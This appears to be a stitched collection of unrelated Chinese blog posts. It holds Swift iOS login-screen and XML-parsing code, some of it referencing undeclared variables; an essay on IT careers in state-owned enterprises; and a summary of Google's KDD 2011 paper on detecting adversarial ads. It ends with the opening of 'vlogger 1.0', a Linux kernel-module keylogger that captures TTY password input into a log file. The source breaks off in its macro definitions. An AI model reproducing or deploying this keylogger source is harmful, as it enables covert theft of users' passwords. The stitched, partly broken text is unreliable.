            mainView.addSubview(ai)
            
            window.frame = frame
            mainView.frame = frame
           
            window.windowLevel = UIWindowLevelAlert
            window.center = self.view.center
            window.hidden = false
            window.addSubview(mainView)
一般的实现方法：


  //  activityIndicatorView
            
            m_objActivityIndicatorView = UIActivityIndicatorView(activityIndicatorStyle: UIActivityIndicatorViewStyle.WhiteLarge)
            m_objActivityIndicatorView!.frame = CGRectMake(self.view.frame.size.width/2 - 100, self.view.frame.size.height/2 - 100, 200, 200)
            m_objActivityIndicatorView!.hidesWhenStopped = true
            m_objActivityIndicatorView!.color = UIColor.blackColor()
            m_objActivityIndicatorView!.layer.cornerRadius = 6
            m_objActivityIndicatorView!.layer.masksToBounds = true
            
            self.view.addSubview(m_objActivityIndicatorView)









给大家推荐两个学习的地址：
极客学院的视频：http://www.jikexueyuan.com/path/ios/
一个博客：http://blog.csdn.net/lizhongfu2013/article/details/29210015

主要想要实现一个模仿的登陆界面
代码：

//
//  LoginViewController.swift
//  IBM_LOGIN
//
//  Created by dcintern on 6/26/15.
//  Copyright (c) 2015 dcintern. All rights reserved.
//

//import Foundation

import UIKit

class LoginViewController: UIViewController
{

    


/// 定义属性
var QQNumber = UITextField()
var PassNumber = UITextField()


override func viewDidLoad() {
    
    self.view.backgroundColor = UIColor.whiteColor()
    super.viewDidLoad()
    
    // 添加头图片
    [self .addAllSubViews()];
}

// 添加所有子控件
func addAllSubViews(){
    
    /// 平铺背景
    var headImage = UIImageView(frame: CGRectMake(0,0, 400, 800))
    headImage.image =  UIImage(named:"123.jpeg")
    self.view.addSubview(headImage)
    
    /// QQ号输入提示，暂时没有用到
    var phoneText = UILabel(frame: CGRectMake(30, 240, UIScreen.mainScreen().bounds.size.width-60, 30))
    phoneText.text = ""
    self.view.addSubview(phoneText)
    
    /// QQ号输入框
    var QQNumber = UITextField(frame: CGRectMake(30, 150, UIScreen.mainScreen().bounds.size.width-60, 30))
    QQNumber.placeholder = " username"
    QQNumber.layer.borderWidth = 2
    QQNumber.layer.borderColor = UIColor.lightGrayColor().CGColor
    QQNumber.layer.cornerRadius = 5
    QQNumber.keyboardType = UIKeyboardType.NumberPad
    self.view.addSubview(QQNumber)
    self.QQNumber = QQNumber
    
    /// 密码输入提示，暂时没用到
    var passText = UILabel(frame: CGRectMake(30, 300, UIScreen.mainScreen().bounds.size.width-60, 30))
    passText.text = ""
    self.view.addSubview(passText)
    
    /// 密码输入框
    var PassNumber = UITextField(frame: CGRectMake(30, 200, UIScreen.mainScreen().bounds.size.width-60, 30))
    PassNumber.placeholder = " password"
    PassNumber.layer.borderWidth = 2
    PassNumber.layer.borderColor = UIColor.lightGrayColor().CGColor
    PassNumber.layer.cornerRadius = 5
    self.view.addSubview(PassNumber)
    self.PassNumber = PassNumber
    
    /// 密码找回
    var button = UIButton(frame: CGRectMake(200, 360, 120, 30))
    UIButton.buttonWithType(UIButtonType.Custom)
    button.setTitle("忘记密码", forState: UIControlState.Normal)
    button.setTitleColor(UIColor.lightGrayColor(), forState: UIControlState.Normal)
    self.view.addSubview(button)
    button.addTarget(self, action: "onClick", forControlEvents: UIControlEvents.TouchUpInside)
    
}

/// 密码找回方法实现
func onClick()
{
    
    ///找回密码提示
    UIAlertView(title: "温馨提示", message: "新密码已发送至手机上", delegate: nil, cancelButtonTitle: "确定", otherButtonTitles: "取消").show()
}
/**
点击界面键盘辞去第一响应者
*/
override func touchesBegan(touches: NSSet, withEvent event: UIEvent)
{
    
    self.QQNumber.resignFirstResponder()
    self.PassNumber.resignFirstResponder()
}

}



 实现根据xml进行布局：

import UIkit



class LoginViewController :  UIViewController,NSXMLParserDelegate

{

        

        ///

        

    

        /// 定义属性

        var m_Username = UITextField()

        var m_Password = UITextField()

    

    

        var m_backgroundRect = CGRectMake(0,0,0,0)

        var m_UsernameRect = CGRectMake(0,0,0,0)

        var m_PassWordRect = CGRectMake(0,0,0,0)

    

        var m_ConnectRect = CGRectMake(0,0,0,0)

        var m_ForgetRect = CGRectMake(0,0,0,0)

    

        var myActivityIndicator: UIActivityIndicatorView!

        

        override func viewDidLoad()

        {

            

            self.view.backgroundColor = UIColor.whiteColor()

            super.viewDidLoad()

            

            

            var parser = NSXMLParser(contentsOfURL: NSURL(fileURLWithPath: NSBundle.mainBundle().pathForResource("LoginLayout", ofType: "xml")!))

            

            parser?.delegate = self

            parser?.parse()

            // 添加头图片

            [self .addAllSubViews()];

        }

        

        // 添加所有子控件

        func addAllSubViews()

        {

            

            /// 平铺背景

           // var headImage = UIImageView(frame: m_backgroundRect)

           // headImage.image =  UIImage(named:"background.jpg")

            //self.view.addSubview(headImage)

            

            

           

            

            //float lightblue[]={0.6824f, 0.7882f, 1.0f, 1.0f};

            //var color = CGColorCreate(CGColorSpaceCreateDeviceRGB(), myColor)

            ServerAddress.layer.borderColor = UIColor.blackColor().CGColor

            ServerAddress.layer.cornerRadius = 5

            self.view.addSubview(ServerAddress)

            self.m_ServerAddress = ServerAddress

            

            /// username input textbox

            var Username = UITextField(frame: m_UsernameRect)

            Username.placeholder = " username"

            Username.layer.borderWidth = 2

            Username.layer.borderColor = UIColor.blackColor().CGColor

            Username.layer.cornerRadius = 5

            

            self.view.addSubview(Username)

            self.m_Username = Username

            

            /// password input textbox

            var Password = UITextField(frame: m_PassWordRect)

            Password.placeholder = " password"

            Password.layer.borderWidth = 2

            Password.layer.borderColor = UIColor.blackColor().CGColor

            Password.layer.cornerRadius = 5

            self.view.addSubview(Password)

            self.m_Password = Password

            

            /// confirm the connection button

            var confirmbutton = UIButton(frame: m_ConnectRect)

            UIButton.buttonWithType(UIButtonType.Custom)

            

            confirmbutton.setTitle("Connect", forState: UIControlState.Normal)

            confirmbutton.setTitleColor(UIColor.blackColor(), forState: UIControlState.Normal)

            self.view.addSubview(confirmbutton)

            confirmbutton.addTarget(self, action: "onClickConfirm", forControlEvents: UIControlEvents.TouchUpInside)

            



            

            /// findback password button

            var button = UIButton(frame: m_ForgetRect)

            UIButton.buttonWithType(UIButtonType.Custom)

            button.setTitle("Forget password!", forState: UIControlState.Normal)

            button.setTitleColor(UIColor.lightGrayColor(), forState: UIControlState.Normal)

            self.view.addSubview(button)

            button.addTarget(self, action: "onClickFindPasswordBack", forControlEvents: UIControlEvents.TouchUpInside)

            

            

           // myActivityIndicator = UIActivityIndicatorView()

            

            //myActivityIndicator.activityIndicatorViewStyle = UIActivityIndicatorViewStyle.Gray

            //myActivityIndicator.center = self.view.center;

            

            myActivityIndicator = UIActivityIndicatorView(activityIndicatorStyle: .White)

            myActivityIndicator.frame = CGRectMake(self.view.frame.size.width/2 - 50, 250, 100, 100)

            myActivityIndicator.color = UIColor.blackColor()

            

            self.view.addSubview(myActivityIndicator);

            

        }

    

        ///on confirm connettion

        func onClickConfirm()

        {

        

        ///check if ip,username,passname is correct

           println(m_ServerAddress.text)

            //eares the space before and after

            



            

           

        }

    

        /// 密码找回方法实现

        func onClickFindPasswordBack()

        {

            

            ///找回密码提示, otherButtonTitles: "取消"这个参数如何传进去？

            UIAlertView(title: "温馨提示", message: "新密码已发送至手机上", delegate: nil, cancelButtonTitle: "确定").show()

        }

        /**

        点击界面键盘辞去第一响应者

        */

        override func touchesBegan(touches: NSSet, withEvent event: UIEvent)

        {

                      self.m_Username.resignFirstResponder()

            self.m_Password.resignFirstResponder()

        }

        

        

        

        var currentNodeName:String!

        

        func parser(parser: NSXMLParser, didStartElement elementName: String!, namespaceURI: String!, qualifiedName qName: String!, attributes attributeDict: [NSObject : AnyObject]!)

        {

            

            currentNodeName = elementName

            

            //review the code using swith

            if elementName == "background"

            {

                let x = CGFloat(((attributeDict["x"]! as String )as NSString).floatValue)

                let y = CGFloat(((attributeDict["y"]! as String ) as NSString).floatValue)

                let Width = CGFloat(((attributeDict["Width"]! as String )as NSString).floatValue)

                let Height = CGFloat(((attributeDict["Height"]! as String ) as NSString).floatValue)

                

                m_backgroundRect = CGRectMake(x,y,Width,Height)

                

            }

            else if(elementName == "ServerAddress")

            {

                let x = CGFloat(((attributeDict["x"]! as String )as NSString).floatValue)

                let y = CGFloat(((attributeDict["y"]! as String ) as NSString).floatValue)

                let Width = CGFloat(((attributeDict["Width"]! as String )as NSString).floatValue)

                let Height = CGFloat(((attributeDict["Height"]! as String ) as NSString).floatValue)

                

                m_ServerAddressRect = CGRectMake(x,y,Width,Height)

            }



            else if(elementName == "Username")

            {

                let x = CGFloat(((attributeDict["x"]! as String )as NSString).floatValue)

                let y = CGFloat(((attributeDict["y"]! as String ) as NSString).floatValue)

                let Width = CGFloat(((attributeDict["Width"]! as String )as NSString).floatValue)

                let Height = CGFloat(((attributeDict["Height"]! as String ) as NSString).floatValue)



                m_UsernameRect = CGRectMake(x,y,Width,Height)

            }

            else if(elementName == "Password")

            {

                let x = CGFloat(((attributeDict["x"]! as String )as NSString).floatValue)

                let y = CGFloat(((attributeDict["y"]! as String ) as NSString).floatValue)

                let Width = CGFloat(((attributeDict["Width"]! as String )as NSString).floatValue)

                let Height = CGFloat(((attributeDict["Height"]! as String ) as NSString).floatValue)



                m_PassWordRect = CGRectMake(x,y,Width,Height)

            }

            else if(elementName == "Connect")

            {

                let x = CGFloat(((attributeDict["x"]! as String )as NSString).floatValue)

                let y = CGFloat(((attributeDict["y"]! as String ) as NSString).floatValue)

                let Width = CGFloat(((attributeDict["Width"]! as String )as NSString).floatValue)

                let Height = CGFloat(((attributeDict["Height"]! as String ) as NSString).floatValue)

                

                m_ConnectRect = CGRectMake(x,y,Width,Height)

            }

            else if(elementName == "Forget")

            {

                let x = CGFloat(((attributeDict["x"]! as String )as NSString).floatValue)

                let y = CGFloat(((attributeDict["y"]! as String ) as NSString).floatValue)

                let Width = CGFloat(((attributeDict["Width"]! as String )as NSString).floatValue)

                let Height = CGFloat(((attributeDict["Height"]! as String ) as NSString).floatValue)

                

                m_ForgetRect = CGRectMake(x,y,Width,Height)

            }



        }

        

        func parser(parser: NSXMLParser, foundCharacters string: String!) {

            //        println(string)

            

            var str = string.stringByTrimmingCharactersInSet(NSCharacterSet.whitespaceAndNewlineCharacterSet())

            if str != ""{

                println("current node : \(currentNodeName),value : \(str)")

            }

        }

        

        

        override func didReceiveMemoryWarning() {

            super.didReceiveMemoryWarning()

            // Dispose of any resources that can be recreated.

        }

    

    

    lazy var m_connect: ConnectServer? = {

        

        return ConnectServer()

        }()

    

}










xml：

<LoginLayout>
    <background x="0" y="0" Width="400" Height="800">
        <Image name="background.jpg">  </Image>
    </background>
    
    
    <Username x="30" y="150" Width="300" Height="30">
    </Username>
    <Password x="30" y="200" Width="300" Height="30">
    </Password>
    
    
    
    <Connect x="30" y="250" Width="100" Height="30">
    </Connect>
    
    <Forget x="200" y="250" Width="200" Height="30">
    </Forget>
</LoginLayout>


 对xml解析类的封装：
NSXMLParser(data: data)，这个有几种初始化的方法，但是string就不行，得转换成NSdata，还是比较蛋疼的

//
//  VMXMLParser.swift
//  XMLParserTest
//
//  Created by Jimmy Jose on 22/08/14.
//https://github.com/varshylmobile/VMXMLParser
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
// THE SOFTWARE.

import Foundation

// Todo: Add documentation
class VMXMLParser: NSObject,NSXMLParserDelegate{
    
    private let kParserError = "Parser Error"
    private var activeElement = ""
    private var previousElement = "-1"
    private var previousElementValue = ""
    private var arrayFinalXML = NSMutableArray()
    private var dictFinalXML  = NSMutableDictionary()
    private var completionHandler:((tags:NSArray?, error:String?)->Void)?
    
    var lameMode = true
    
    var reoccuringTag:NSString = ""
    var m_Projects:[String] = []
    /**
    Initializes a new parser with url of NSURL type.
    
    :param: url The url of xml file to be parsed
    :param: completionHandler The completion handler
    
    :returns: Void.
    */
    
    override init() {
        
        super.init()
        
    }
    
    func parseXMLFromURL(url:NSURL,takeChildOfTag:NSString,completionHandler:((tags:NSArray?, error:String?)->Void)? = nil){
        
        self.reoccuringTag = takeChildOfTag
        VMXMLParser().initWithURL(url, completionHandler: completionHandler)
        
    }
    
    func parseXMLFromURLString(urlString:NSString,takeChildOfTag:NSString,completionHandler:((tags:NSArray?, error:String?)->Void)? = nil){
        self.reoccuringTag = takeChildOfTag
        
        initWithURLString(urlString, completionHandler: completionHandler)
    }
    
    
    func parseXMLFromData(data:NSData,takeChildOfTag:NSString,completionHandler:((tags:NSArray?, error:String?)->Void)? = nil){
        self.reoccuringTag = takeChildOfTag
        initWithContentsOfData(data, completionHandler:completionHandler)
        
    }
    
    
    class func initParserWithURL(url:NSURL,completionHandler:((tags:NSArray?, error:String?)->Void)? = nil){
        
        VMXMLParser().initWithURL(url, completionHandler: completionHandler)
        
    }
    
    class func initParserWithURLString(urlString:NSString,completionHandler:((tags:NSArray?, error:String?)->Void)? = nil){
        
        VMXMLParser().initWithURLString(urlString, completionHandler: completionHandler)
    }
    
    
    class func initParserWithData(data:NSData,completionHandler:((tags:NSArray?, error:String?)->Void)? = nil){
        
        VMXMLParser().initWithContentsOfData(data, completionHandler:completionHandler)
        
    }
    
    
    private func initWithURL(url:NSURL,completionHandler:((tags:NSArray?, error:String?)->Void)? = nil) -> AnyObject {
        
        parseXMLForUrl(url :url, completionHandler: completionHandler)
        
        return self
        
    }
    
    
    
    private func initWithURLString(urlString :NSString,completionHandler:((tags:NSArray?, error:String?)->Void)? = nil) -> AnyObject {
        
        let url = NSURL(string: urlString as String)!
        parseXMLForUrl(url :url, completionHandler: completionHandler)
        
        return self
    }
    
    private func initWithContentsOfData(data:NSData,completionHandler:((tags:NSArray?, error:String?)->Void)? = nil) -> AnyObject {
        
        initParserWith(data: data)
        
        return self
        
    }
    
    private func parseXMLForUrl(#url:NSURL,completionHandler:((tags:NSArray?, error:String?)->Void)? = nil){
        
        self.completionHandler = completionHandler
        
        beginParsingXMLForUrl(url)
        
    }
    
    private func beginParsingXMLForUrl(url:NSURL){
        
        let request:NSURLRequest = NSURLRequest(URL:url)
        
        let queue:NSOperationQueue = NSOperationQueue()
        
        NSURLConnection.sendAsynchronousRequest(request,queue:queue,completionHandler:{response,data,error in
            
            if(error != nil){
                if(self.completionHandler != nil){
                    self.completionHandler?(tags:nil,error:error.localizedDescription)
                }
                
            }else{
                
                self.initParserWith(data: data)
                
            }})
    }
    
    
    private func initParserWith(#data:NSData){
        
        var parser = NSXMLParser(data: data)
        parser.delegate = self
        
        var success:Bool = parser.parse()
        
        if success {
            
            if(self.arrayFinalXML.count > 0)
            {
                if(self.completionHandler != nil)
                {
                    self.completionHandler?(tags:self.arrayFinalXML,error:nil)
                }
            }
            
        }
        else
        {
            
            if(self.completionHandler != nil)
            {
                self.completionHandler?(tags:nil,error:kParserError)
            }
        }
        
    }
    
    internal func parser(parser: NSXMLParser, didStartElement elementName: String, namespaceURI: String?, qualifiedName qName: String?, attributes attributeDict: [NSObject : AnyObject]) {
        activeElement = elementName;
        println(elementName)
        if elementName == "Project"
        {
            let name = (attributeDict["Name"]! as String )
            println(name)
            m_Projects.append(name)
            
        }

        if(reoccuringTag.isEqualToString(elementName)){
            
            dictFinalXML = NSMutableDictionary()
        }
    }
    
    internal func parser(parser: NSXMLParser, didEndElement elementName: String, namespaceURI: String?, qualifiedName qName: String?) {
        
        if(reoccuringTag.length == 0){
            if((dictFinalXML.objectForKey(activeElement)) != nil){
                
                arrayFinalXML.addObject(dictFinalXML)
                dictFinalXML = NSMutableDictionary()
                
            }else{
                
                dictFinalXML.setValue(previousElementValue, forKey: activeElement)
            }
        }else{
            //println(elementName)
            if(reoccuringTag.isEqualToString(elementName)){
                
                arrayFinalXML.addObject(dictFinalXML)
                dictFinalXML = NSMutableDictionary()
                
            }else{
                
                dictFinalXML.setValue(previousElementValue, forKey: activeElement)
                
            }
            
        }
        
        previousElement = "-1"
        previousElementValue = ""
        
    }
    
    
    internal func parser(parser: NSXMLParser, foundCharacters string: String?) {

        if var str = string as NSString? {
            str = str.stringByTrimmingCharactersInSet(NSCharacterSet.whitespaceAndNewlineCharacterSet())
            
            if((previousElement as NSString).isEqualToString("-1")){
                
                previousElement = activeElement
                previousElementValue = str as String
                
            }else{
                
                if((previousElement as NSString).isEqualToString(activeElement)){
                    
                    previousElementValue = previousElementValue + (str as String)
                    
                }else{
                    
                    previousElement = activeElement
                    previousElementValue = str as String
                }
            }   
        }
    }
    
    
    internal func parser(parser: NSXMLParser, parseErrorOccurred parseError: NSError) {
        if(self.completionHandler != nil){
            self.completionHandler?(tags:nil,error:parseError.localizedDescription)
        }
    }
    
}











不是混不下去了才写生存指南，因为我妈指着新闻联播说，娃呀，你要是不在国企干了，在这上面见你的机会就基本没了，我。。。

特别提醒：含有保密协议的国企，研究所，慎重选择！！！ 
一旦离职很有可能是完全脱产一年时间来进行脱密

1. 真实的找工作故事
2016年我要毕业于是从2015年底我就开始准备找工作了。当时还在IBM实习，实习期间，并没有做出什么出彩的工作。只是按照师傅的要求，对于组内调查问卷的pc端产品。移植到ISO上做了一个简单的demo，使用tinyxml2解析xml生成调查问卷模板并展示，白天做这个，晚上回去改自己写的一个没啥创新点的论文，用图论做立体匹配，分割后构造图的时候多给边上加个权值。平时还要练习leetcode，成天瞎忙，然而结果没有陪我演戏。金九银十没有一家互联网企业给我发offer。
bat加京东笔试全挂，我已经开始怀疑人生。信心的丧失部分影响了我对后续单位情况的判断。
只有绿盟过了一面，完美世界和Intel到了二面就杳无音讯，我当时一直在应聘c++程序员，完美世界二面全问的tcp网络协议，滑动窗口拥塞控制，不会，至今，也不会，毫无悬念的跪了。
Intel二面和一个女面试官聊了一个多小时，异常开心，说了很多很多IBM的实习见闻，感觉高端养老院的企业文化在哪都是喜闻乐见的，结果还是没过，非常费解。
绿盟就有一些意思了，笔试题做的不错，一面聊了两句我说我是CSDN博客专家斑竹，好了回去等消息，二面我说我在IBM实习过，好了回去等消息，结果说要等副总来面谈，这一下又等了好久，三面是副总，直接问想要多钱，我说我不是为了钱，主要是看中企业文化和未来发展，副总上下打量着我说8500咋样，我心想offer终于来了，已经很超出我的预期了。
在等绿盟三面的过程中，一个本地的研究所邀我去面试，暂且称为S所。 
S所面试一共来了两波人，第一波校招五个，第二波社招五个，校招五个一问，交大，西大，长大，好家伙不会是叫我来充数的吧，面试也没问啥，自我介绍一完，问了三个问题，会这个嘛，会那个嘛，我说，会，熟练，精通。
然后就是二面，直接人事处处长开始介绍待遇了，交大的同学问了很多和切身利益相关的具体问题，比如工资具体是多少。然后我惊奇的发现，入职工资是根据学校划分的，比如，西电的5500，西农的6000，师大的5000，后来我很费解，为啥师大这么低，原来我本科不行，西农由于是985所以碾压了大家，有趣的事情就此开始了。

2. 困惑
我曾经在国企非常困惑的一点就是，我每天在单位干了不少活，为啥那么像丙方，而且工资那么低呢？参考文献中说道，你干的活其实没有什么财富价值。
为什么要离开现在的单位，因为根本没有为社会创造财富。所以我现在的工作只有单位支付工资，他并不值钱。
在国企工作的IT从业人员难免会因为周围的环境变的迷失，一个清晰的职业生涯规划是非常重要的，我一度一段时间里一壶茶一支烟一张报纸看半天搓完手机搓电脑，也有通宵蹲在机房忍受机器的轰鸣。反正我是越干越困惑，我到底是为谁在卖命？
最近有幸和IBM的一些高级架构方案师们有了一些交流，有句老话说：单位就像一棵爬满猴子的大树，向上看全是屁股，向下看都是笑脸，左右皆是耳目。每个人都在颠簸的尘世中寻找平衡的支点，我们平时在国企唯领导马首是瞻，这是一种深井病，我们只关注领导的一举一动，对了也不是，错了也不是，因为你只能看到领导的屁股，你又能猜测出些什么有价值的东西呢？所以干活缺乏主观能动性。
假如加入的是创业型公司，这样的态度是不能有的。你需要时刻想着，我能为单位做些什么，我能怎么利用我的才能让单位、团队向着好的方向发展。 
假如你身处任何位置都能有这样的想法，那么成功指日可待。

3. 建议
过来人给出几个小tips，还望大家海涵

多与领导沟通，因为会哭的孩子有奶吃，领导干部那么忙，他根本不知道你干了多少活，怎么给你涨工资？kpi考核，不存在的。。。
勤于表现，是金子总会发光，炼丹炉里面的金子，发什么光！ 
在国企的技术人员不好混，人员关系特别复杂，要想专心把技术搞上来，可能要比在互联网公司付出更大代价。
工作不饱和，强度小是国企IT人员的显著特点，多利用闲暇时间系统的学习一门手艺，更多的领导注意意味着更多的资源与平台，早日出人头地实现梦想在于抓住机会表现自己的闪光点。
懂得拒绝，不是自己的活一般不要干，比如你文章写的好，领导有个新闻稿让你写，你写还是不写？写了以后是不是都归你写了？清晰的职业规划告诉你，咱应该focus on 一些东西，技术人员要成为T字型人才，宽度要足够，但也要有一项立足之本的技术做到足够深入。
不要和周围的人同流合污，别人没时间看书，成天玩，你不能玩，要高标准高要求自己。别人雄安新区2亩地，咱呢？
调整心态，在国有企业的IT从业者，要有一种健康的心理状态，不要总想着自己拿着卖白菜的心，操着卖白粉的心，还拿钱最少，心态不好了干活的效果也不好。人从来都不是累死的，而是懒死的，生于忧患死于安乐，天道酬勤对于年轻人来说一点都不假。

未完待续
今天先说到这里，有兴趣的欢迎留言评论，说出你自己的故事。

参考文献
年薪50万美金的工程师到底牛在哪里? 









作者：黄永刚
Practical machine learning tricks from the KDD 2011 best industry paper

原文链接：http://blog.david-andrzejewski.com/machine-learning/practical-machine-learning-tricks-from-the-kdd-2011-best-industry-paper/

研究机器学习的论文通常倾向于提出一种新理论或算法，对于问题背景、数据表示、特征工程等往往是只言片语，然而这些东西对于读者的理解和算法的重现是非常重要的。鉴于论文目的和格式的约束，只能用有限的文字去描述更核心通常比较抽象的思想。
因此，对于在工业系统中应用论文中的方法所必须的实现细节，论文中很少进行描述。机器学习的这些方面，被称为‘平民智慧’，大多数来自同事间的讨论、博客、论坛、开源库等一手的经验之谈。
不同于以上的描述，有些会议设有专题对工业界的方法进行追踪，提出了很多能够提高机器学习在实践应用中效率的见解。我们下来要介绍的这篇文章，它来自于goolge荣获KDD 2011 最佳工业论文，关于检测广告作弊。

Detecting Adversarial Advertisements in the Wild \ 
  D. Sculley, Matthew Otey, Michael Pohl, Bridget Spitznagel, \ 
  John Hainsworth, Yunkai Zhou \ 
http://research.google.com/pubs/archive/37195.pdf

看到这个主题，第一个想法，这不就是机器学习界的“hello world”吗！随便找一本相关的书籍或者教程里面都有，对于正样本集和负样本集分别训练一个朴素贝叶斯，就OK了。很显然，这和Google的应用场景相差甚远，这篇文章阐述了现实当中的许多挑战，是google商业应用需要解决的关键问题。
这篇文章提出了很多不同的方法和技巧，我在这里只简单的描述文章中的重点，我极力鼓励对此感兴趣的读者直接去查看他们的论文1和演示文稿[^slide]。 
2:https://www.eecs.tufts.edu/~dsculley/papers/adversarial-ads.pdf 
http://www.eecs.tufts.edu/~dsculley/papers/Detecting_Adversarial_Advertisements.pdf

1. 分类（Classification）
机器学习的核心方法是分类：这个广告展示给用户是不是OK？这里有一些源代码关于机器学习的核心方法3

方法集成
获得Netflix奖的方法、微软的Kinect及IBM Watson,这些系统都使用了集成方法，将许多不同模型产生的结果集合起来做出最终的预测。这个方法在当前众多的方法中可以称得上是最省心的方法了，如果你的目标是预测精确度，至少也应该考虑使用集成的方法。
只执行高可靠的预测
衡量预测的不确定性并适当的对系统的执行条件进行调整是非常必要的。在这个应用中，需要做出合理的决策，因此，当预测结果可靠性不高时，系统应该不执行相应的动作。
找出大量的特征，使用L1正则进行特征选择
特征表示是机器学习设计中的关键问题，它涵盖了非常广的范围：对于广告有表述的用词、表述主题、链接到的网站、链接落地页、广告商等等，会产生大量的特征，使用L1正则强制稀疏化特征集，最终得到较少的与结果关联性强的特征。
特征降维
处理高维特征这是十分实用的方法，通过降维将特征映射到低维空间。
使用排序来处理不均衡问题
这种极不均衡数据问题是典型的监督式分类中的疑难杂症，广告中大多是正常数据，只有极少量是异常数据[此类问题十分常见]。这类问题有很多的处理方法，在这里他们通过将这个问题转化为排序问题，获得了性能上的改进。恶意广告应该比正常广告获得更高的排名。
使用分类器的级联
还是不均衡问题，对于负样本中也存在不同的种类，如恶意软件刷点击、假冒伪劣商品等。这里同时采用了两阶段的分类。第一阶段判断正常或者异常？第二阶段，如果这个广告属于异常，是不是属于异常A，是不是异常B，以此类推。

2. 可扩展性、工程实现、操作
不同于为了发论文所写的实验性软件，线上的机器学习系统是有工程和商业背景。系统的可扩展性、可用性、可靠性、可维护性也十分重要。
MapReduce:预处理(map), 算法训练(reduce)
稍微有些意外，他们发现性能瓶颈是来自于从磁盘加载数据和提取特征的阶段。因此，他们使用多个map作业并行执行，用一个reduce来做随机梯度下降分类训练（Stochastic Gradient Descent, SGD）
部署监控
为了使系统始终如一的工作，需要监控一些数据，以便于一些异常出现的时候能够做进一步的研究，如： 
- 持有数据上的precision/recall  
- 输入特征的分布 
- 输出值的分布 
- 输出类别的分布 
- 人工定期评价系统质量
丰富模型对象
在机器学习的论文中，一个预测模型经常归结于数学思想即学习到的特征权重向量。然而，在软件工程实践中，作者认为将“模型对象”拓展更广泛的范围会十分有用，例如包含特征转换、概率校准、训练超参等。

3. 人工经验
基于商业考量，提出通用的解决方法需要人类专家的参与。
有效的利用专家经验
对于界限模糊的情况或比较难分辨的情况，人工专家手工进行标注，然后采用主动学习策略识别这些高价值数据。他们为人类专家提供了可以获取信息的用户接口，以便发现新出现的异常威胁。
允许人为的编制规则
相比于全自动化的机器学习方法，有的时候人类才是知道如何做才最好。因此，他们允许专家们在适当的时候，编制一些规则进去。
人为评估
专家的判断也不能理解为事情的本质,专家提供的标签也会因人为因素产生错误，不同的专家对于各个类别理解的也不一样。为了调整这种不确定性， 请多个专家对同一事物进行判别来调整标签的可信度。如果有兴趣可以参考这里4.
最后，他们阶段性进行非专业评估以确保系统对于大众来说工作正常。用户满意是最终目标，如果进行量化衡量就完美了。
https://www.eecs.tufts.edu/~dsculley/papers/adversarial-ads.pdf 
[^slide]:http://www.eecs.tufts.edu/~dsculley/papers/Detecting_Adversarial_Advertisements.pdf ↩https://www.eecs.tufts.edu/~dsculley/papers/adversarial-ads.pdf 
[^slide]:http://www.eecs.tufts.edu/~dsculley/papers/Detecting_Adversarial_Advertisements.pdf ↩http://code.google.com/p/sofia-ml/ ↩http://web.stanford.edu/~jurafsky/amt.pdf ↩ 






/*
 *　vlogger 1.0
 *
 *　Copyright (C) 2002 rd <rd@vnsecurity.net>
 *
 *　Please check http://www.thehackerschoice.com/ for update
 *
 *　This program is free software; you can redistribute it and/or modify
 *　it under the terms of the GNU General Public License as published by
 *　the Free Software Foundation; either version 2 of the License, or
 *　(at your option) any later version
 *
 *　This program is distributed in the hope that it will be useful, but 
 *　WITHOUT ANY WARRANTY; without even the implied warranty of
 *　MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.　See the GNU 
 *　General Public License for more details.
 *
 *　Greets to THC & vnsecurity
 *
 */
#define __KERNEL_SYSCALLS__
#include <linux/version.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/smp_lock.h>
#include <linux/sched.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <linux/file.h>
#include <asm/uaccess.h>
#include <linux/proc_fs.h>
#include <asm/errno.h>
#include <asm/io.h>
#ifndef KERNEL_VERSION
#define KERNEL_VERSION(a,b,c) (((a) << 16) + ((b) << 8) + (c))
#endif
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,4,9)
MODULE_LICENSE("GPL");
MODULE_AUTHOR("rd@vnsecurity.net");
#endif
#define MODULE_NAME "vlogger "
#define MVERSION "vlogger 1.0 - by rd@vnsecurity.netn"
#ifdef DEBUG
#define DPRINT(format, args...) printk(MODULE_NAME format, ##args)
#else
#define DPRINT(format, args...)
#endif
#define N_TTY_NAME "tty"
#define N_PTS_NAME "pts"
#define MAX_TTY_CON 8
#define MAX_PTS_CON 256
#define LOG_DIR "/tmp/log"
#define PASS_LOG LOG_DIR "/pass.log"
#define TIMEZONE 7*60*60 // GMT+7
#define ESC_CHAR 27
#define BACK_SPACE_CHAR1 127 // local
#define BACK_SPACE_CHAR2 8 // remote
#define VK_TOGLE_CHAR 29 // CTRL-]
#define MAGIC_PASS "31337"  // to switch mode, press MAGIC_PASS and 
　　// VK_TOGLE_CHAR
#define VK_NORMAL 0
#define VK_DUMBMODE 1
#define VK_SMARTMODE 2
#define DEFAULT_MODE VK_DUMBMODE
#define MAX_BUFFER 256
#define MAX_SPECIAL_CHAR_SZ 12
#define TTY_NUMBER(tty) MINOR((tty)->device) - (tty)->driver.minor_start 
　 + (tty)->driver.name_base
#define TTY_INDEX(tty) tty->driver.type == 
　 TTY_DRIVER_TYPE_PTY?MAX_TTY_CON + 
　 TTY_NUMBER(tty):TTY_NUMBER(tty)
#define IS_PASSWD(tty) L_ICANON(tty) && !L_ECHO(tty)
#define TTY_WRITE(tty, buf, count) (*tty->driver.write)(tty, 0, 
　　　 buf, count)
#define TTY_NAME(tty) (tty->driver.type == 
　TTY_DRIVER_TYPE_CONSOLE?N_TTY_NAME: 
　tty->driver.type == TTY_DRIVER_TYPE_PTY && 
